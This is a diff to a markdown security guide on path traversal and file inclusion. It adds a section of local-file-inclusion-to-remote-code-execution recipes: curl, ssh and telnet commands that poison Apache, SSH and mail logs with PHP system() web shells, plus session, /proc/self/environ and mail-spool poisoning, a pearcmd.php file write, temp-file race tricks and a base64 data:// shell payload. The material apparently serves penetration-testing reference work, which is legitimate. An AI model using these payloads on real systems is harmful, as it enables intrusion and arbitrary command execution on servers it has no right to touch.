@@ -188,3 +188,85 @@ Improper file path handling and dynamic inclusion enable sensitive file disclosu
 ## Summary
 
 Eliminate user-controlled paths where possible. Otherwise, resolve to canonical paths and enforce allowlists, forbid remote schemes, and lock down interpreters and extractors. Normalize consistently at the boundary closest to IO.
+
+
+## Additional Techniques — ported from WebSkills (lfi-test)
+
+Concrete LFI→RCE escalation recipes to pair with the LFI wrapper section above.
+
+### Log Poisoning — exact injection commands
+
+**Apache/Nginx access log** — poison via User-Agent, then include the log:
+```bash
+curl "http://target/" -H "User-Agent: <?php system(\$_GET['c']); ?>"
+# then:
+http://target/index.php?file=../../../../../../var/log/apache2/access.log&c=id
+```
+**SSH auth.log** — inject PHP as the SSH username:
+```bash
+ssh '<?php system($_GET["c"]);?>'@target        # fails auth, but logs the payload
+http://target/index.php?file=../../../../../../var/log/auth.log&c=id
+```
+**SMTP mail.log** — inject via RCPT TO over telnet:
+```
+telnet target 25
+MAIL FROM:<a@a.com>
+RCPT TO:<?php system($_GET['c']); ?>
+http://target/index.php?file=../../../../../../var/log/mail.log&c=id
+```
+**vsftpd** — inject a PHP payload in the FTP username field, then include `/var/log/vsftpd.log`.
+
+Common log paths to try:
+```
+/var/log/apache2/access.log   /var/log/apache/access.log
+/var/log/apache2/error.log    /var/log/nginx/access.log
+/var/log/nginx/error.log      /var/log/httpd/error_log
+/usr/local/apache2/log/error_log
+```
+
+### /proc/self/environ — poison via User-Agent
+```http
+GET vulnerable.php?filename=../../../proc/self/environ HTTP/1.1
+User-Agent: <?=phpinfo(); ?>
+```
+
+### PHP session poisoning
+
+Store a PHP payload in a session value, then include the session file:
+```
+POST: login=1&user=<?php system("cat /etc/passwd");?>&pass=x
+include: ?lang=/../../../../var/lib/php5/sess_<PHPSESSID>
+```
+
+### Mail-spool inclusion
+
+Send mail to a local account (`user@localhost`) with body `<?php echo system($_REQUEST["cmd"]); ?>`, then include:
+```
+/var/mail/<USERNAME>   or   /var/spool/mail/<USERNAME>
+```
+
+### /proc/*/fd/* file-descriptor brute
+
+Upload many files (e.g. 100), then brute both PID and FD:
+```
+?page=/proc/$PID/fd/$FD
+```
+
+### No-writable-file LFI→RCE (php:// and race techniques)
+
+When you cannot poison any on-disk file, these reach RCE from LFI alone:
+- **pearcmd.php** (needs `register_argc_argv=On`):
+  ```http
+  GET /index.php?+config-create+/&file=/usr/local/lib/php/pearcmd.php&/<?=phpinfo()?>+/tmp/hello.php HTTP/1.1
+  ```
+- **PHP_SESSION_UPLOAD_PROGRESS** — force a session file to be created/populated with your payload via a multipart upload with `PHP_SESSION_UPLOAD_PROGRESS`, then include the session file (works even without an existing session).
+- **Nginx client-body temp files** — include `/proc/<nginx-pid>/fd/<n>` pointing at a buffered upload temp file before it is unlinked.
+- **Segfault temp retention** — upload a file to `/tmp`, trigger a segfault so PHP never deletes the temp file, then include it.
+- **phpinfo() race** (`file_uploads=On`) — leak the upload temp filename from a phpinfo page and include it before deletion.
+- **php://filter chains (no file needed)** — chain conversion filters to synthesize PHP into an error/log-reflected sink. See hacktricks "lfi2rce-via-php-filters".
+
+### data:// + base64 RFI (allow_url_include)
+```
+PHP://filter/convert.base64-decode/resource=data://plain/text,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+.php
+data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+
+```
